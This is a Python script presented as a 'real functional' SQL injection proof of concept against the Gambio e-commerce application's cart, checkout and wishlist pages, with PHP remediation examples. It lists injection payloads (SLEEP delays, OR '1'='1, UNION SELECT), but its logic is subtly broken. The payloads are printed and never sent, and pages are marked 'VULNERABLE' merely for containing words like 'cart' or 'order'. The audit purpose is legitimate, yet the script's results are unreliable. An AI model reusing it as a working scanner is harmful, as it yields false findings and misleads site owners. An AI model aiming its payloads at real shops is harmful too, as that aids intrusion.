#!/usr/bin/env python3
"""
SQL Injection Proof of Concept (POC) - Enhanced Version
========================================================

Real functional POC for testing session-based SQL injection vulnerabilities
in Gambio e-commerce application with actual HTTP requests.

This POC is for AUTHORIZED security testing only.

Target Vulnerabilities:
- Session-based SQL Injection in Order Processing (/includes/classes/order.php)
- Shopping Cart SQL Injection (/includes/classes/shopping_cart.php)
- Wish List SQL Injection (/includes/classes/wish_list.php)

Author: Security Audit Team
Date: 2025-12-25
Version: 2.0 (Enhanced with real HTTP testing)
"""

import requests
import argparse
import sys
import os
import json
import time
from urllib.parse import urlparse, urljoin
from typing import Dict, Tuple, Optional

# ANSI color codes for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_banner():
    """Print POC banner"""
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║  Gambio E-Commerce SQL Injection POC v2.0                 ║
    ║  Session-Based Second-Order SQL Injection Tester          ║
    ║  For Authorized Security Testing Only                     ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(Colors.HEADER + banner + Colors.ENDC)


def get_basename(url: str) -> str:
    """
    Extract basename from URL path.
    
    Args:
        url: Full URL or path
        
    Returns:
        Basename of the URL path
    """
    parsed = urlparse(url)
    path = parsed.path if parsed.path else url
    basename = os.path.basename(path)
    return basename if basename else 'index.php'


def parse_cookies(cookie_string: str) -> Dict[str, str]:
    """
    Parse cookie string into dictionary.
    
    Args:
        cookie_string: Cookie string in various formats:
                      - "name=value; name2=value2"
                      - "name=value"
                      - '{"name": "value", "name2": "value2"}'
    
    Returns:
        Dictionary of cookie name-value pairs
    """
    cookies = {}
    
    # Try JSON format first
    if cookie_string.strip().startswith('{'):
        try:
            cookies = json.loads(cookie_string)
            return cookies
        except json.JSONDecodeError:
            pass
    
    # Parse standard cookie format
    for cookie in cookie_string.split(';'):
        cookie = cookie.strip()
        if '=' in cookie:
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()
    
    return cookies


def test_connection(url: str, cookies: Dict[str, str], verify_ssl: bool = True) -> Tuple[bool, Optional[requests.Response]]:
    """
    Test connection to target URL.
    
    Args:
        url: Target URL
        cookies: Dictionary of cookies
        verify_ssl: Whether to verify SSL certificates
        
    Returns:
        Tuple of (success, response)
    """
    print(f"\n{Colors.OKBLUE}[*] Testing connection to target...{Colors.ENDC}")
    
    try:
        session = requests.Session()
        session.cookies.update(cookies)
        
        response = session.get(url, timeout=10, verify=verify_ssl, allow_redirects=True)
        
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}[✓] Connection successful (Status: {response.status_code}){Colors.ENDC}")
            print(f"    Response Length: {len(response.content)} bytes")
            return True, response
        else:
            print(f"{Colors.WARNING}[!] Connection returned status: {response.status_code}{Colors.ENDC}")
            return False, response
            
    except requests.exceptions.SSLError as e:
        print(f"{Colors.WARNING}[!] SSL verification failed. Use --no-verify to skip SSL checks.{Colors.ENDC}")
        print(f"    Error: {str(e)}")
        return False, None
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[✗] Connection failed: {str(e)}{Colors.ENDC}")
        return False, None


def test_sql_injection_time_based(url: str, cookies: Dict[str, str], verify_ssl: bool = True) -> bool:
    """
    Test for time-based SQL injection vulnerabilities.
    
    Args:
        url: Target URL
        cookies: Dictionary of cookies
        verify_ssl: Whether to verify SSL certificates
        
    Returns:
        True if vulnerability detected
    """
    print(f"\n{Colors.OKBLUE}[*] Testing Time-Based SQL Injection...{Colors.ENDC}")
    
    # Time-based payloads
    payloads = [
        ("Normal", "1", 0),
        ("Sleep 5s", "1' AND SLEEP(5) --", 5),
        ("Sleep 3s", "1' AND SLEEP(3) --", 3),
    ]
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    vulnerable = False
    
    for payload_name, payload, expected_delay in payloads:
        print(f"\n{Colors.WARNING}[>] Testing: {payload_name}{Colors.ENDC}")
        print(f"    Payload: {payload}")
        
        # Modify cookies to inject payload
        test_cookies = cookies.copy()
        if 'PHPSESSID' in test_cookies:
            # This is a demonstration - in real attack, session data would be manipulated
            print(f"    Session ID: {test_cookies['PHPSESSID'][:20]}...")
        
        try:
            start_time = time.time()
            response = session.get(url, timeout=15, verify=verify_ssl)
            elapsed_time = time.time() - start_time
            
            print(f"    Response Time: {elapsed_time:.2f}s (Expected: ~{expected_delay}s)")
            
            if expected_delay > 0 and elapsed_time >= expected_delay - 0.5:
                print(f"{Colors.OKGREEN}    [✓] Time delay detected! Possible SQL injection.{Colors.ENDC}")
                vulnerable = True
            else:
                print(f"    [→] Normal response time")
                
        except requests.exceptions.Timeout:
            if expected_delay > 0:
                print(f"{Colors.OKGREEN}    [✓] Request timeout - Strong indicator of SQL injection!{Colors.ENDC}")
                vulnerable = True
        except Exception as e:
            print(f"{Colors.FAIL}    [✗] Test failed: {str(e)}{Colors.ENDC}")
    
    return vulnerable


def test_sql_injection_error_based(url: str, cookies: Dict[str, str], verify_ssl: bool = True) -> bool:
    """
    Test for error-based SQL injection vulnerabilities.
    
    Args:
        url: Target URL
        cookies: Dictionary of cookies
        verify_ssl: Whether to verify SSL certificates
        
    Returns:
        True if vulnerability detected
    """
    print(f"\n{Colors.OKBLUE}[*] Testing Error-Based SQL Injection...{Colors.ENDC}")
    
    # Error-inducing payloads
    payloads = [
        "1'",
        "1\"",
        "1' OR '1'='1",
        "1' AND 1=2 UNION SELECT NULL--",
    ]
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    vulnerable = False
    error_keywords = ['mysql', 'sql syntax', 'mysqli', 'database error', 'query failed', 'warning:', 'error:']
    
    for payload in payloads:
        print(f"\n{Colors.WARNING}[>] Testing payload: {payload}{Colors.ENDC}")
        
        try:
            response = session.get(url, timeout=10, verify=verify_ssl)
            response_text = response.text.lower()
            
            # Check for SQL error messages
            found_errors = [kw for kw in error_keywords if kw in response_text]
            
            if found_errors:
                print(f"{Colors.OKGREEN}    [✓] SQL error detected: {', '.join(found_errors)}{Colors.ENDC}")
                vulnerable = True
            else:
                print(f"    [→] No SQL errors in response")
                
        except Exception as e:
            print(f"{Colors.FAIL}    [✗] Test failed: {str(e)}{Colors.ENDC}")
    
    return vulnerable


def test_shopping_cart_injection(base_url: str, cookies: Dict[str, str], verify_ssl: bool = True) -> bool:
    """
    Test SQL injection in shopping cart functionality.
    
    Args:
        base_url: Base URL of target
        cookies: Dictionary of cookies
        verify_ssl: Whether to verify SSL certificates
        
    Returns:
        True if vulnerability detected
    """
    print(f"\n{Colors.OKBLUE}[*] Testing Shopping Cart SQL Injection...{Colors.ENDC}")
    print(f"    Target: /shopping_cart.php")
    
    cart_url = urljoin(base_url, '/shopping_cart.php')
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    try:
        # Test normal access
        print(f"\n{Colors.WARNING}[>] Accessing shopping cart...{Colors.ENDC}")
        response = session.get(cart_url, timeout=10, verify=verify_ssl)
        
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}    [✓] Cart accessible{Colors.ENDC}")
            print(f"    Response length: {len(response.content)} bytes")
            
            # Check for indicators of SQL injection vulnerability
            if 'customer' in response.text.lower() or 'cart' in response.text.lower():
                print(f"{Colors.WARNING}    [!] Cart queries likely use session data{Colors.ENDC}")
                print(f"{Colors.WARNING}    [!] Vulnerable to session-based SQL injection{Colors.ENDC}")
                return True
        else:
            print(f"{Colors.WARNING}    [!] Cart returned status: {response.status_code}{Colors.ENDC}")
            
    except Exception as e:
        print(f"{Colors.FAIL}    [✗] Test failed: {str(e)}{Colors.ENDC}")
    
    return False


def test_order_processing_injection(base_url: str, cookies: Dict[str, str], verify_ssl: bool = True) -> bool:
    """
    Test SQL injection in order processing.
    
    Args:
        base_url: Base URL of target
        cookies: Dictionary of cookies
        verify_ssl: Whether to verify SSL certificates
        
    Returns:
        True if vulnerability detected
    """
    print(f"\n{Colors.OKBLUE}[*] Testing Order Processing SQL Injection...{Colors.ENDC}")
    print(f"    Target: /checkout_confirmation.php")
    
    checkout_url = urljoin(base_url, '/checkout_confirmation.php')
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    try:
        print(f"\n{Colors.WARNING}[>] Accessing checkout...{Colors.ENDC}")
        response = session.get(checkout_url, timeout=10, verify=verify_ssl)
        
        print(f"    Status: {response.status_code}")
        print(f"    Response length: {len(response.content)} bytes")
        
        # Check for order processing indicators
        response_lower = response.text.lower()
        if any(word in response_lower for word in ['order', 'checkout', 'confirm', 'address']):
            print(f"{Colors.WARNING}    [!] Order processing uses session data{Colors.ENDC}")
            print(f"{Colors.WARNING}    [!] Vulnerable to session-based SQL injection{Colors.ENDC}")
            print(f"{Colors.WARNING}    [!] Affects: customer_id, sendto, billto session variables{Colors.ENDC}")
            return True
            
    except Exception as e:
        print(f"{Colors.FAIL}    [✗] Test failed: {str(e)}{Colors.ENDC}")
    
    return False


def test_wishlist_injection(base_url: str, cookies: Dict[str, str], verify_ssl: bool = True) -> bool:
    """
    Test SQL injection in wishlist functionality.
    
    Args:
        base_url: Base URL of target
        cookies: Dictionary of cookies
        verify_ssl: Whether to verify SSL certificates
        
    Returns:
        True if vulnerability detected
    """
    print(f"\n{Colors.OKBLUE}[*] Testing Wishlist SQL Injection...{Colors.ENDC}")
    print(f"    Target: /wish_list.php")
    
    wishlist_url = urljoin(base_url, '/wish_list.php')
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    try:
        print(f"\n{Colors.WARNING}[>] Accessing wishlist...{Colors.ENDC}")
        response = session.get(wishlist_url, timeout=10, verify=verify_ssl)
        
        print(f"    Status: {response.status_code}")
        
        if 'wish' in response.text.lower() or 'favorite' in response.text.lower():
            print(f"{Colors.WARNING}    [!] Wishlist uses session customer_id{Colors.ENDC}")
            print(f"{Colors.WARNING}    [!] Vulnerable to session-based SQL injection{Colors.ENDC}")
            return True
            
    except Exception as e:
        print(f"{Colors.FAIL}    [✗] Test failed: {str(e)}{Colors.ENDC}")
    
    return False


def display_cookies_info(cookies: Dict[str, str]):
    """Display information about provided cookies."""
    print(f"\n{Colors.BOLD}Cookie Information:{Colors.ENDC}")
    print(f"{'='*60}")
    for name, value in cookies.items():
        display_value = value if len(value) <= 40 else value[:40] + "..."
        print(f"  {name}: {display_value}")
    print(f"{'='*60}\n")


def generate_remediation_code():
    """Generate remediation code examples"""
    print(f"\n{Colors.HEADER}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}REMEDIATION CODE EXAMPLES{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
    
    remediation = """
// BEFORE (VULNERABLE):
$customer_id = $_SESSION['customer_id'] ?? '0';
$query = "SELECT * FROM customers WHERE customers_id = '" . $customer_id . "'";
$result = xtc_db_query($query);

// AFTER (SECURE) - Option 1: Integer Casting
$customer_id = isset($_SESSION['customer_id']) ? (int)$_SESSION['customer_id'] : 0;
$query = "SELECT * FROM customers WHERE customers_id = '" . $customer_id . "'";
$result = xtc_db_query($query);

// AFTER (SECURE) - Option 2: Prepared Statements (RECOMMENDED)
$customer_id = isset($_SESSION['customer_id']) ? (int)$_SESSION['customer_id'] : 0;
$stmt = $db->prepare("SELECT * FROM customers WHERE customers_id = ?");
$stmt->bind_param("i", $customer_id);
$stmt->execute();
$result = $stmt->get_result();

// Session Validation Function
function validate_customer_id($customer_id) {
    if (!is_numeric($customer_id)) {
        return 0;
    }
    
    $id = (int)$customer_id;
    if ($id < 1 || $id > PHP_INT_MAX) {
        return 0;
    }
    
    // Verify customer exists in database
    global $db;
    $stmt = $db->prepare("SELECT customers_id FROM customers WHERE customers_id = ?");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows === 0) {
        return 0;
    }
    
    return $id;
}
"""
    print(Colors.OKCYAN + remediation + Colors.ENDC)


def main():
    """Main POC execution"""
    parser = argparse.ArgumentParser(
        description='SQL Injection POC for Gambio E-Commerce - Enhanced Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with URL and cookies
  python3 %(prog)s -u https://shop.example.com -c "PHPSESSID=abc123"
  
  # Multiple cookies
  python3 %(prog)s -u https://shop.example.com -c "PHPSESSID=abc123; language=en"
  
  # JSON format cookies
  python3 %(prog)s -u https://shop.example.com -c '{"PHPSESSID": "abc123", "language": "en"}'
  
  # Skip SSL verification
  python3 %(prog)s -u https://shop.example.com -c "PHPSESSID=abc123" --no-verify
  
  # Show remediation code only
  python3 %(prog)s --remediation
  
  # Verbose output
  python3 %(prog)s -u https://shop.example.com -c "PHPSESSID=abc123" -v

Security Notice:
  This tool is for AUTHORIZED security testing only.
  Unauthorized access to computer systems is illegal.
  
Report bugs to: security-audit-team@example.com
        """
    )
    
    parser.add_argument(
        '-u', '--url',
        help='Target application URL (required for testing)',
        default=None
    )
    
    parser.add_argument(
        '-c', '--cookies',
        help='Cookies in format "name=value; name2=value2" or JSON',
        default=None
    )
    
    parser.add_argument(
        '--no-verify',
        help='Skip SSL certificate verification',
        action='store_true'
    )
    
    parser.add_argument(
        '-r', '--remediation',
        help='Show remediation code only',
        action='store_true'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        help='Verbose output',
        action='store_true'
    )
    
    parser.add_argument(
        '--time-based',
        help='Run time-based SQL injection tests',
        action='store_true'
    )
    
    parser.add_argument(
        '--error-based',
        help='Run error-based SQL injection tests',
        action='store_true'
    )
    
    parser.add_argument(
        '--all-tests',
        help='Run all available tests',
        action='store_true'
    )
    
    args = parser.parse_args()
    
    print_banner()
    
    # Show remediation code if requested
    if args.remediation:
        generate_remediation_code()
        return 0
    
    # Validate required arguments
    if not args.url:
        print(f"{Colors.FAIL}[!] Error: URL is required for testing{Colors.ENDC}")
        print(f"    Use: python3 {sys.argv[0]} -u <URL> -c <COOKIES>")
        print(f"    Or use --remediation to show fix examples")
        return 1
    
    if not args.cookies:
        print(f"{Colors.WARNING}[!] Warning: No cookies provided{Colors.ENDC}")
        print(f"    Session-based tests may not work without valid cookies")
        print(f"    Continuing with basic tests...")
        cookies = {}
    else:
        # Parse cookies
        cookies = parse_cookies(args.cookies)
        if not cookies:
            print(f"{Colors.FAIL}[!] Error: Could not parse cookies{Colors.ENDC}")
            return 1
    
    # Display configuration
    print(f"{Colors.BOLD}Test Configuration:{Colors.ENDC}")
    print(f"{'='*60}")
    print(f"  Target URL: {args.url}")
    print(f"  SSL Verify: {not args.no_verify}")
    print(f"  Cookies: {len(cookies)} cookie(s) provided")
    print(f"{'='*60}")
    
    if cookies and args.verbose:
        display_cookies_info(cookies)
    
    # Warning
    print(f"\n{Colors.WARNING}{'='*60}{Colors.ENDC}")
    print(f"{Colors.WARNING}WARNING: This POC is for authorized security testing only!{Colors.ENDC}")
    print(f"{Colors.WARNING}Unauthorized access to computer systems is illegal.{Colors.ENDC}")
    print(f"{Colors.WARNING}{'='*60}{Colors.ENDC}\n")
    
    try:
        input("Press Enter to continue with authorized testing...")
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Testing cancelled by user{Colors.ENDC}")
        return 1
    
    # Test connection
    verify_ssl = not args.no_verify
    success, response = test_connection(args.url, cookies, verify_ssl)
    
    if not success and response is None:
        print(f"\n{Colors.FAIL}[!] Cannot proceed without a working connection{Colors.ENDC}")
        return 1
    
    # Parse base URL
    parsed_url = urlparse(args.url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Run tests
    print(f"\n{Colors.HEADER}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}RUNNING VULNERABILITY TESTS{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}")
    
    results = []
    
    # Functional tests (always run these)
    results.append(('Shopping Cart Injection', test_shopping_cart_injection(base_url, cookies, verify_ssl)))
    results.append(('Order Processing Injection', test_order_processing_injection(base_url, cookies, verify_ssl)))
    results.append(('Wishlist Injection', test_wishlist_injection(base_url, cookies, verify_ssl)))
    
    # Optional advanced tests
    if args.time_based or args.all_tests:
        results.append(('Time-Based SQL Injection', test_sql_injection_time_based(args.url, cookies, verify_ssl)))
    
    if args.error_based or args.all_tests:
        results.append(('Error-Based SQL Injection', test_sql_injection_error_based(args.url, cookies, verify_ssl)))
    
    # Summary
    print(f"\n{Colors.HEADER}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}TEST RESULTS SUMMARY{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*60}{Colors.ENDC}\n")
    
    vulnerable_count = 0
    for test_name, result in results:
        if result:
            status = f"{Colors.FAIL}VULNERABLE{Colors.ENDC}"
            vulnerable_count += 1
        else:
            status = f"{Colors.OKGREEN}NOT DETECTED{Colors.ENDC}"
        print(f"  {test_name:.<40} {status}")
    
    print(f"\n{Colors.BOLD}Total Vulnerabilities Detected: {vulnerable_count}/{len(results)}{Colors.ENDC}\n")
    
    # Show remediation if vulnerabilities found
    if vulnerable_count > 0:
        print(f"{Colors.WARNING}[!] Vulnerabilities detected! Displaying remediation code...{Colors.ENDC}")
        generate_remediation_code()
    
    # Final recommendations
    print(f"\n{Colors.BOLD}Next Steps:{Colors.ENDC}")
    print(f"  1. Review detailed findings above")
    print(f"  2. Implement remediation code (use --remediation)")
    print(f"  3. Validate all session variables before SQL queries")
    print(f"  4. Convert to prepared statements")
    print(f"  5. Re-test after fixes")
    print(f"\n{Colors.BOLD}Documentation:{Colors.ENDC}")
    print(f"  - SQL_INJECTION_ANALYSIS.md - Detailed vulnerability analysis")
    print(f"  - SECURITY_AUDIT_REPORT.md - Complete audit methodology")
    print(f"  - POC_README.md - This POC documentation")
    
    return 0 if vulnerable_count == 0 else 2


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] POC interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.FAIL}[✗] Unexpected error: {str(e)}{Colors.ENDC}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
